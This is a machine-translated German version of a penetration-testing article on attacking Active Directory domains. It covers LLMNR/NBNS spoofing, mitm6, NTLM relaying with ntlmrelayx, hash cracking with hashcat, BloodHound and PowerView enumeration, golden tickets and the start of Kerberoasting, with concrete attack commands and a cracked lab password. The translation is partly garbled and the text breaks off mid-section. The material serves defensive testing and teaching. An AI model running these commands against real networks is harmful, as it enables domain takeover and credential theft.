<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üíã üê© ü§® Domain-Angriffe üï∫ üîÑ üë©üèª‚Äçüíº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Bei der Durchf√ºhrung von Penetrationstests stellen wir h√§ufig Fehler in der Dom√§nenkonfiguration fest. Obwohl dies f√ºr viele nicht kritisch erscheint,...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Domain-Angriffe</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/449278/"><img src="https://habrastorage.org/webt/om/yi/ln/omyiln4hxyukdu7znc3sn5j-mzy.png"><br>  Bei der Durchf√ºhrung von Penetrationstests stellen wir h√§ufig Fehler in der Dom√§nenkonfiguration fest.  Obwohl dies f√ºr viele nicht kritisch erscheint, k√∂nnen solche Ungenauigkeiten in der Realit√§t dazu f√ºhren, dass die gesamte Dom√§ne kompromittiert wird. <br><br>  Nach den Ergebnissen des Pentests in einem Unternehmen kamen wir beispielsweise zu dem Schluss, dass alle verf√ºgbaren Computer in der Dom√§ne nicht niedriger als Windows 10 / Windows Server 2016 waren und die neuesten Patches enthielten.  Das Netzwerk wurde regelm√§√üig gescannt, die Maschinen waren hart.  Alle Benutzer sa√üen durch Token und kannten ihre "20-stelligen Passw√∂rter" nicht.  Alles scheint in Ordnung zu sein, aber IPv6 wurde nicht deaktiviert.  Das Domain-Capture-Schema sah folgenderma√üen aus: <br><br>  mitm6 -&gt; ntlmrelay -&gt; Angriff durch Delegierung -&gt; lokaler Administrator-Passwort-Hash wird empfangen -&gt; Dom√§nenadministrator-Passwort-Hash wird empfangen. <br><br>  Leider lehren g√§ngige Zertifizierungen wie OSCP, GPEN oder CEH keine Active Directory-Penetrationstests. <br><br>  In diesem Artikel werden verschiedene Arten von Active Directory-Angriffen, die wir im Rahmen von Pentests ausgef√ºhrt haben, sowie die verwendeten Tools beschrieben.  Dies kann in keiner Weise als vollst√§ndige Anleitung f√ºr alle Arten von Angriffen und Tools angesehen werden. Es gibt wirklich viele davon, und es ist schwierig, in einen Artikel zu passen. <br><br>  Zur Demonstration verwenden wir einen Laptop unter Kali Linux 2019 und die darauf gehosteten virtuellen Hosts unter VMware.  Stellen Sie sich vor, das Hauptziel des Pentests besteht darin, Dom√§nenadministratorrechte zu erhalten, und als Eingabe haben wir √ºber Ethernet Zugriff auf das Unternehmensnetzwerk des Unternehmens.  Um die Domain testen zu k√∂nnen, ben√∂tigen wir ein Konto. <br><a name="habracut"></a><br><h1>  Ein Konto bekommen </h1><br>  Betrachten Sie die beiden meiner Meinung nach am h√§ufigsten verwendeten Methoden zum Abrufen der Anmeldung und des Kennworts f√ºr das Dom√§nenkonto: LLMNR / NBNS-Spoofing und Angriff auf das IPv6-Protokoll. <br><br><h3>  LLMNR / NBNS Spoofing </h3><br>  √úber diesen Angriff wurde ziemlich viel gesagt.  Unter dem Strich sendet der Client Multicast-LLMNR und sendet NBT-NS-Anforderungen zum Aufl√∂sen von Hostnamen, wenn DNS fehlschl√§gt.  Jeder Netzwerkbenutzer kann solche Anfragen beantworten. <br><br>  Tools, die einen Angriff erm√∂glichen: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Antwort</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Inveight</a> </li><li>  Metasploit-Module: auxiliary / spoof / llmnr / llmnr_response, auxiliary / spoof / nbns / nbns_response, <br>  Auxiliary / Server / Capture / SMB, Auxiliary / Server / Capture / http_ntlm </li></ul><br>  Bei einem erfolgreichen Angriff k√∂nnen wir den NetNTLM-Hash des Benutzerpassworts abrufen. <br><br><pre><code class="bash hljs">Responder -I eth0 -wrf</code> </pre> <br><img src="https://habrastorage.org/webt/ul/6f/1r/ul6f1rsc1dbtugnzoiup43cofnc.png"><br><br>  Mit dem resultierenden Hash k√∂nnen wir NTLM-Relays debuggen oder ausf√ºhren. <br><br><h3>  IPv6-Angriff </h3><br>  Wenn IPv6 im Unternehmensnetzwerk verwendet wird, k√∂nnen wir auf DHCPv6-Anforderungen antworten und unsere IP-Adresse als DNS-Server auf dem angegriffenen Computer festlegen.  Da IPv6 Vorrang vor IPv4 hat, werden Client-DNS-Abfragen an unsere Adresse gesendet.  Lesen Sie hier mehr √ºber den Angriff. <br><br>  Werkzeuge: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">mitm6</a> </li></ul><br>  Mitm6-Dienstprogramm ausf√ºhren <br><br><pre> <code class="bash hljs">mitm6 -i vmnet0</code> </pre> <br>  Nach Abschluss des Angriffs wird auf der angegriffenen Workstation ein neuer DNS-Server mit unserer IPv6-Adresse angezeigt. <br><br><img src="https://habrastorage.org/webt/ww/w4/w3/www4w3x2eqtuytsmysia_deoi_y.png"><br><br>  Angegriffene Computer versuchen, sich bei unserem Computer zu authentifizieren.  Nachdem wir den SMB-Server mit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">dem</a> Dienstprogramm <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">smbserver.py aufgerufen haben</a> , k√∂nnen wir Benutzerkennwort-Hashes <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">abrufen</a> . <br><br><pre> <code class="bash hljs">smbserver.py -smb2support SMB /root/SMB</code> </pre> <br><img src="https://habrastorage.org/webt/df/s8/jx/dfs8jxcdecrikctqxdxzbuyq8wk.png"><br><br><h2>  Erfasste Hash-Aktionen </h2><br>  Der n√§chste Schritt besteht darin, entweder einen kryptografischen Angriff auf die Kennwort-Hashes durchzuf√ºhren und das Kennwort im Klartext abzurufen oder ein NTLM-Relay durchzuf√ºhren. <br><br><h3>  Passwort Brute Force </h3><br>  Es ist ganz einfach: Nehmen Sie einen Passwort-Hash, Hashcat <br><br><pre> <code class="bash hljs">hashcat -m 5600 -a 3 hash.txt /usr/share/wordlists/rockyou.txt</code> </pre> <br>  und Brutus.  Das Passwort kann entweder erhalten werden oder nicht :) <br><br><img src="https://habrastorage.org/webt/pf/l8/7g/pfl87glgjcfbove5ywlkmul1uyi.png"><br>  <i>Das Harvey-Benutzerkennwort wurde wiederhergestellt - Pbvf2019</i> <br><br><h3>  NTLM-Relais </h3><br>  Wir k√∂nnen auch NTLM-Relais ausf√ºhren.  Nachdem wir sichergestellt haben, dass <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SMB Signing</a> nicht verwendet wird <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">, verwenden wir</a> das Dienstprogramm <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ntlmrelayx.py</a> und f√ºhren einen Angriff durch.  Auch hier w√§hlen wir je nach Ziel den gew√ºnschten Vektor aus.  Betrachten wir einige davon. <br><br><br><h4>  Zugriff auf den angegriffenen Computer √ºber das SMB-Protokoll </h4><br>  F√ºhren Sie einen Angriff mit Schl√ºssel <i>i durch</i> . <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t 192.168.1.5 -l loot -i</code> </pre> <br><img src="https://habrastorage.org/webt/jk/3w/zu/jk3wzuzoxwr2qnrzhagq7bnweya.png"><br><br>  Bei einem erfolgreichen Angriff k√∂nnen wir mithilfe von Netcat eine Verbindung zum Remote-Computer herstellen. <br><br><img src="https://habrastorage.org/webt/1f/8x/ba/1f8xbajj3gofx2bonp0quqdnxae.png"><br><br><h4>  Domain Information Collection </h4><br>  In diesem Fall f√ºhren wir das Relay zum Dom√§nencontroller durch. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldap://192.168.1.2</code> </pre> <br>  Wenn der Angriff erfolgreich ist, erhalten wir detaillierte Informationen zur Domain: <br><br><img src="https://habrastorage.org/webt/el/gf/eu/elgfeumon83qjseesppzb8yjitq.png"><br><br><h4>  Hinzuf√ºgen eines neuen Computers zur Dom√§ne </h4><br>  Jeder Benutzer kann standardm√§√üig bis zu 10 Computer in der Dom√§ne erstellen.  Um einen Computer zu erstellen, m√ºssen Sie ein Relay auf einem Dom√§nencontroller mithilfe des ldaps-Protokolls ausf√ºhren.  Das Erstellen von Benutzern und Computern √ºber eine unverschl√ºsselte LDAP-Verbindung ist untersagt.  Au√üerdem kann kein Konto erstellt werden, wenn die Verbindung √ºber SMB abgefangen wird. <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldaps://192.168.1.2 --add-computer</code> </pre> <br><img src="https://habrastorage.org/webt/ei/xe/qi/eixeqiuxwttuxx3xmmroqrj8smy.png"><br><br>  Wie Sie in der Abbildung sehen k√∂nnen, konnten wir einen Computer RORYOTGS $ erstellen. <br><br>  Beim Erstellen von mehr als 10 Computern wird die folgende Fehlermeldung angezeigt: <br><br><img src="https://habrastorage.org/webt/gb/za/ar/gbzaarxwpzhs0zhy4zi8kvwuqjo.png"><br><br>  Mit den Anmeldeinformationen eines RORYOTGS $ -Computers k√∂nnen wir legitime Anforderungen an einen Dom√§nencontroller ausf√ºhren. <br><br><h1>  Domain Information Collection </h1><br>  Wir haben also einen Dom√§nenbenutzer oder ein Computerkonto.  Um mit dem Testen fortzufahren, m√ºssen wir verf√ºgbare Informationen f√ºr die weitere Angriffsplanung sammeln.  Betrachten Sie einige der Tools, mit denen wir die Suche nach den kritischsten Systemen ermitteln, einen Angriff planen und ausf√ºhren k√∂nnen. <br><br><h3>  Bluthund </h3><br>  Eines der wichtigsten Werkzeuge, das bei fast allen internen Penetrationstests verwendet wird.  Das Projekt wird aktiv weiterentwickelt und durch neue Funktionen erg√§nzt. <br><br><div class="spoiler">  <b class="spoiler_title">Vom Bluthund gesammelte Informationen</b> <div class="spoiler_text"><ul><li>  Gruppe - F√ºhrt eine Gruppenmitgliedschaftssammlung durch </li><li>  LocalAdmin - F√ºhrt eine lokale Administratorsammlung durch </li><li>  RDP - F√ºhrt eine Remotedesktopbenutzersammlung durch </li><li>  DCOM - F√ºhrt eine Sammlung verteilter COM-Benutzer durch </li><li>  GPOLocalGroup - F√ºhrt eine lokale Administratorsammlung mithilfe von Gruppenrichtlinienobjekten durch </li><li>  Sitzung - F√ºhrt die Sitzungserfassung durch </li><li>  ComputerOnly - F√ºhrt die lokale Admin-, RDP-, DCOM- und Sitzungssammlung durch </li><li>  LoggedOn - F√ºhrt eine Sammlung privilegierter Sitzungen durch (erfordert Administratorrechte auf Zielsystemen) </li><li>  Vertrauensstellungen - F√ºhrt eine Aufz√§hlung der Dom√§nenvertrauensstellungen durch </li><li>  ACL - F√ºhrt eine Sammlung von ACLs durch </li><li>  Container - F√ºhrt eine Sammlung von Containern durch. </li><li>  DcOnly - F√ºhrt die Erfassung nur mit LDAP durch.  Beinhaltet Group, Trusts, ACL, ObjectProps, Container und GPOLocalGroup </li><li>  Alle - F√ºhrt alle Erfassungsmethoden au√üer GPOLocalGroup und LoggedOn aus </li><li>  Gesamtstruktur durchsuchen - Durchsuchen Sie alle Dom√§nen in der Gesamtstruktur anstatt nur Ihre aktuelle </li><li>  Domain - Suchen Sie eine bestimmte Domain.  Verwendet Ihre aktuelle Domain, wenn null (Standard: null) </li><li>  Stealth - F√ºhrt Stealth-Erfassungsmethoden aus.  Alle Stealth-Optionen sind Single-Threaded-Optionen </li><li>  SkipGCDeconfliction - √úberspringen Sie die Dekonfliktierung des globalen Katalogs w√§hrend der Sitzungsaufz√§hlung.  Dies kann die Aufz√§hlung beschleunigen, f√ºhrt jedoch zu m√∂glichen Ungenauigkeiten in den Daten </li><li>  ExcludeDc - Schlie√üt Dom√§nencontroller von der Aufz√§hlung aus (vermeidet Microsoft ATA-Flags) </li><li>  Computerdatei - Geben Sie eine Datei an, aus der Computernamen / IPs geladen werden sollen </li><li>  OU - Geben Sie an, welche OU aufgelistet werden soll </li></ul><br></div></div><br>  Die Informationssammler sind <a href="">SharpHound.exe</a> (erfordert die Installation von .NET v3.5) und das in <a href="">Powershell</a> geschriebene Skript SharpHound.ps1.  Es gibt auch einen Compiler, der von einem Python-Entwickler von Drittanbietern, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bloodhound-Python, geschrieben wurde</a> . <br><br>  Als Datenbank wird <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Neo4j</a> verwendet, das √ºber eine eigene Syntax verf√ºgt, mit der Sie benutzerdefinierte Abfragen ausf√ºhren k√∂nnen.  Weitere Informationen zur Syntax finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Standardm√§√üig sind 12 Anfragen verf√ºgbar</b> <div class="spoiler_text"><ul><li>  Hier finden Sie alle Domain-Administratoren </li><li>  Finden Sie die k√ºrzesten Wege zu Domain-Administratoren </li><li>  Finden Sie Principals mit DCSync-Rechten </li><li>  Benutzer mit ausl√§ndischer Domaingruppenmitgliedschaft </li><li>  Gruppen mit ausl√§ndischer Domain-Gruppenmitgliedschaft </li><li>  Zuordnen von Domain-Vertrauensstellungen </li><li>  K√ºrzeste Wege zu uneingeschr√§nkten Delegierungssystemen </li><li>  K√ºrzeste Pfade von Kerberoastable-Benutzern </li><li>  K√ºrzeste Wege zu Dom√§nenadministratoren von Kerberoastable-Benutzern </li><li>  K√ºrzester Weg von den eigenen Auftraggebern </li><li>  K√ºrzeste Wege zu Domain-Administratoren von eigenen Principals </li><li>  K√ºrzeste Wege zu hochwertigen Zielen </li></ul><br></div></div><br>  Die Entwickler stellen auch das Skript <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">DBCreator.py</a> zur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Verf√ºgung</a> , mit dem Sie eine zuf√§llige Datenbank zum Testen generieren k√∂nnen. <br><br><img src="https://habrastorage.org/webt/do/if/95/doif95xzpkhd3xqbdjbwdenmrfu.png"><br><br>  Neo4j hat eine REST-API.  Es gibt verschiedene Dienstprogramme, die eine Verbindung zur Datenbank herstellen und die empfangenen Daten verwenden k√∂nnen: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Cypherdog</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gofetch</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ANGRYPUPPY</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GT-Generator</a> </li></ul><br>  Betrachten wir einige davon. <br><br><h3>  Cypherdog </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">CypherDog</a> ist eine in Powershell geschriebene BloodHound-Shell.  Enth√§lt 27 Cmdlets. <br><br><div class="spoiler">  <b class="spoiler_title">Cmdlet-Liste</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Cmdlet </td><td>  Synopsis </td></tr><tr><td>  Get-BloodHoundCmdlet </td><td>  BloodHound RTFM - Holen Sie sich Cmdlet </td></tr><tr><td>  Send-Bloodhoundpost </td><td>  BloodHound POST - Cypher to REST API </td></tr><tr><td>  Get-BloodHoundNode </td><td>  BloodHound-Knoten - Get Node </td></tr><tr><td>  Search-BloodHoundNode </td><td>  BloodHound-Knoten - Suchknoten </td></tr><tr><td>  New-BloodHoundNode </td><td>  BloodHound-Knoten - Knoten erstellen </td></tr><tr><td>  Set-Bloodhoundnode </td><td>  BloodHound-Knoten - Update-Knoten </td></tr><tr><td>  Remove-BloodHoundNode </td><td>  BloodHound-Knoten - Knoten l√∂schen </td></tr><tr><td>  Get-BloodHoundNodeList </td><td>  BloodHound Node - Liste abrufen </td></tr><tr><td>  Get-BloodHoundNodeHighValue </td><td>  BloodHound Node - Holen Sie sich HighValue </td></tr><tr><td>  Get-BloodHoundNodeOwned </td><td>  BloodHound Node - Werden Sie Eigent√ºmer </td></tr><tr><td>  Get-BloodHoundNodeNote </td><td>  BloodHound Node - Hinweis erhalten </td></tr><tr><td>  Set-BloodHoundNodeNote </td><td>  BloodHound Node - Notizen setzen </td></tr><tr><td>  Get-BloodHoundBlacklist </td><td>  BloodHound Node - Holen Sie sich die Blacklist </td></tr><tr><td>  Set-BloodHoundBlacklist </td><td>  BloodHound Node - Setze die Blacklist </td></tr><tr><td>  Remove-BloodHoundBlacklist </td><td>  BloodHound Node - Schwarze Liste entfernen </td></tr><tr><td>  Get-BloodHoundEdge </td><td>  BloodHound Edge - Ziel erreichen </td></tr><tr><td>  Get-BloodHoundEdgeReverse </td><td>  BloodHound Edge - Quelle abrufen </td></tr><tr><td>  Get-BloodHoundEdgeCrossDomain </td><td>  BloodHound Edge - Holen Sie sich CrossDomain </td></tr><tr><td>  Get-BloodHoundEdgeCount </td><td>  BloodHound Edge - Get Count </td></tr><tr><td>  Get-BloodHoundEdgeInfo </td><td>  BloodHound Edge - Holen Sie sich Informationen </td></tr><tr><td>  New-BloodHoundEdge </td><td>  BloodHound Edge - Kante erstellen </td></tr><tr><td>  Remove-BloodHoundEdge </td><td>  BloodHound Edge - Edge l√∂schen </td></tr><tr><td>  Get-BloodHoundPathShort </td><td>  BloodHound Path - Am k√ºrzesten werden </td></tr><tr><td>  Get-BloodHoundPathAny </td><td>  BloodHound Path - Holen Sie sich welche </td></tr><tr><td>  Get-BloodHoundPathCost </td><td>  BloodHound Path - Kosten bekommen </td></tr><tr><td>  Get-BloodHoundPathCheap </td><td>  BloodHound Path - G√ºnstigstes Angebot </td></tr><tr><td>  Get-BloodHoundWald0IO </td><td>  BloodHound Path - Holen Sie sich den Wald0-Index </td></tr></tbody></table></div><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Anwendungsbeispiele</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Das Team </td><td>  Beschreibung </td></tr><tr><td>  Search-BloodHoundNode -Type Computer -Property uneingeschr√§nkte Delegation -Wert $ true |  W√§hlen Sie Name, Serviceprincipalnames, unbeschr√§nkte Delegation, Betriebssystem |  Format-Liste </td><td>  Suchen Sie nach Computern mit unbegrenzter Kerberos-Delegierung </td></tr><tr><td>  Edge-Benutzer ADMINISTRATOR@JET.LAB MemberOf Group </td><td>  Benutzergruppen auflisten </td></tr><tr><td>  Welcher Computer hatSession-Benutzer ADMINISTRATOR@JET.LAB </td><td>  Listen Sie Computer auf, auf denen eine Administrator-Benutzersitzung stattfindet </td></tr><tr><td>  Pfadbenutzer Computer HARVEY@JET.LAB DC1.JET.LAB </td><td>  Drucken Sie den Pfad vom Benutzer zum Dom√§nencontroller </td></tr><tr><td>  welcher Benutzer MemberOf Group 'DOMAIN ADMINS@JET.LAB' * |  Listenanmeldung </td><td>  Listen Sie aktive Benutzersitzungen auf, die Mitglieder der Gruppe DOMAIN Admins sind </td></tr><tr><td>  welcher Benutzer MemberOf Group 'DOMAIN ADMINS@JET.LAB' |  Anmeldung auflisten |?  operat * -match 7 |  Liste AdminTo |  Name ausw√§hlen </td><td>  Listen Sie Benutzer mit Administratorrechten auf Arbeitsstationen unter Windows 7 auf, die eine Sitzung mit Benutzern aus der Gruppe der Dom√§nenadministratoren haben </td></tr></tbody></table></div><br></div></div><br>  Standardm√§√üig ist eine Authentifizierung erforderlich, um auf die neo4j-Datenbank zugreifen zu k√∂nnen.  Sie k√∂nnen die Authentifizierung deaktivieren, indem Sie die Datei neo4j.conf bearbeiten.  Die Zeile <i>dbms.security.auth_enabled = false muss auskommentiert werden.</i>  Dies wird jedoch nicht empfohlen, da jeder Benutzer unter 127.0.0.1:7474 (Standardkonfiguration) eine Verbindung zur Datenbank herstellen kann.  Weitere Informationen zur Authentifizierung und Autorisierung in neo4j finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier.</a> <br><br><h3>  Gofetch </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">GoFetch</a> verwendet ein in Bloodhound erstelltes Diagramm, um einen Angriff zu planen und auszuf√ºhren. <br><br><div class="spoiler">  <b class="spoiler_title">Beispiel f√ºr ein Bluthunddiagramm</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/l3/pm/g_/l3pmg_9fw8yy5dkbrftpfq4flyo.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">GoFetch-Logik</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ph/g-/us/phg-usiezxoh0-jz2zvfq4iack8.jpeg"><br></div></div><br>  Angriffsstart <br><br><pre> <code class="bash hljs">.\Invoke-GoFetch.ps1 -PathToGraph .\pathFromBloodHound.json</code> </pre> <br><h3>  GT-Generator </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Mit gt-generator</a> k√∂nnen Sie mithilfe von BloodHound-Daten ganz einfach goldene Tickets erstellen.  Um ein goldenes Ticket zu erhalten, sind nur der Benutzername und das Passwort des KRBTGT-Benutzers erforderlich. <br><br><pre> <code class="bash hljs">python gt-generator.py -s 127.0.0.1 -u user -p pass administrator &lt;KRBTGT_HASH&gt;</code> </pre> <br><img src="https://habrastorage.org/webt/oo/d3/b8/ood3b84ooqbwwawb-pn7nybey_s.png"><br><br><h3>  Powerview </h3><br>  <a href="">PowerView</a> ist ein Powershell-Framework, das in <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PowerSploit enthalten ist</a> .  Im Folgenden finden Sie eine Liste einiger Cmdlets, mit denen Sie Informationen zu einer Domain sammeln k√∂nnen. <br><br><div class="spoiler">  <b class="spoiler_title">Cmdlet-Liste</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Get-NetDomain -Domain jet.lab </td><td>  Holen Sie sich die aktuelle Domain </td></tr><tr><td>  Get-domainSID </td><td>  Rufen Sie die aktuelle Domain-SID ab </td></tr><tr><td>  Get-NetDomainController -Domain jet.lab </td><td>  Holen Sie sich Dom√§nencontroller f√ºr eine Dom√§ne </td></tr><tr><td>  Get-NetUser -Domain jet.lab -UserName labuser </td><td>  Holen Sie sich Benutzer einer Domain </td></tr><tr><td>  Get-NetGroup * Gruppenname * </td><td>  Holen Sie sich alle Gruppen in der aktuellen Domain </td></tr><tr><td>  Get-NetGroupMember -GroupName "Domain Admins" </td><td>  Holen Sie sich alle Mitglieder der Domain Admins-Gruppe </td></tr><tr><td>  Get-NetGroup -UserName "domain_user" </td><td>  Holen Sie sich die Gruppenmitgliedschaft f√ºr einen Benutzer </td></tr><tr><td>  Get-NetComputer -FullData </td><td>  Holen Sie sich alle Computer der Dom√§ne </td></tr><tr><td>  Find-LocalAdminAccess -Verbose </td><td>  Suchen Sie alle Computer in der aktuellen Dom√§ne, auf die der aktuelle Benutzer lokalen Administratorzugriff hat </td></tr><tr><td>  Get-NetSession -ComputerName dc02.jet.lab </td><td>  Listen Sie Sitzungen auf einem bestimmten Computer auf </td></tr><tr><td>  Invoke-UserHunter -CheckAccess </td><td>  Suchen Sie nach Computern, auf denen ein Dom√§nenadministrator angemeldet ist und der aktuelle Benutzer Zugriff hat </td></tr></tbody></table></div><br></div></div><br><h3>  Adidnsdump </h3><br>  Bei Verwendung von integriertem DNS in Active Directory kann jeder Dom√§nenbenutzer alle Standard-DNS-Eintr√§ge abfragen. <br><br>  Verwendetes Werkzeug: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Adidnsdump.</a> <br><br><img src="https://habrastorage.org/webt/hq/48/rb/hq48rboxepskftc5tnlbsnvgfr0.gif"><br><br><h1>  Domain-Angriffe </h1><br>  Nachdem wir die Domain-Informationen haben, fahren wir mit der n√§chsten Phase des Penetrationstests fort - direkt mit dem Angriff.  Betrachten Sie 4 m√∂gliche Vektoren: <br><br><ol><li>  Braten </li><li>  Angriff √ºber ACL </li><li>  Kerberos-Delegation </li><li>  Missbrauch von Gruppenrichtlinienobjektberechtigungen </li></ol><br><br><h3>  Braten </h3><br>  Diese Art von Angriff zielt auf das Kerberos-Protokoll ab.  Es gibt zwei Arten von Angriffen wie Braten: <br><br><ul><li>  Kerberoast </li><li>  Asreproast </li></ul><br><h4>  Kerberoast </h4><br>  Der Angriff wurde erstmals 2014 von User <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Timmedin</a> auf der DerbyCon demonstriert ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Video</a> ).  Bei einem erfolgreichen Angriff k√∂nnen wir das Passwort des Dienstultraschalls im Offline-Modus sortieren, ohne bef√ºrchten zu m√ºssen, den Benutzer zu blockieren.  Sehr oft haben Dienstkonten √ºberm√§√üige Rechte und ein unbefristetes Kennwort, wodurch wir m√∂glicherweise Dom√§nenadministratorrechte erhalten. <br>  √úberlegen Sie, wie Kerberos funktioniert, um die Essenz des Angriffs zu verstehen. <br><br><img src="https://habrastorage.org/webt/vj/g2/ud/vjg2ud1wzdr89drnazgcob0eaum.png"><br><br>  1. Das Passwort wird in einen NTLM-Hash konvertiert, der Zeitstempel wird mit einem Hash verschl√ºsselt und als Authentifikator in der TGT-Ticketanforderung (AS-REQ) an KDC gesendet.  Der Dom√§nencontroller (KDC) √ºberpr√ºft die Benutzerinformationen und erstellt ein TGT-Ticket. <br><br>  2. Das TGT-Ticket wird verschl√ºsselt, signiert und an den Benutzer gesendet (AS-REP).  Nur der Kerberos-Dienst (KRBTGT) kann Daten aus einem TGT-Ticket √∂ffnen und lesen. <br><br>  3. Der Benutzer sendet das TGT-Ticket auf Anfrage des TGS-Tickets (TGS-REQ) an den Dom√§nencontroller.  Der Dom√§nencontroller √∂ffnet ein TGT-Ticket und √ºberpr√ºft die PAC-Pr√ºfsumme. 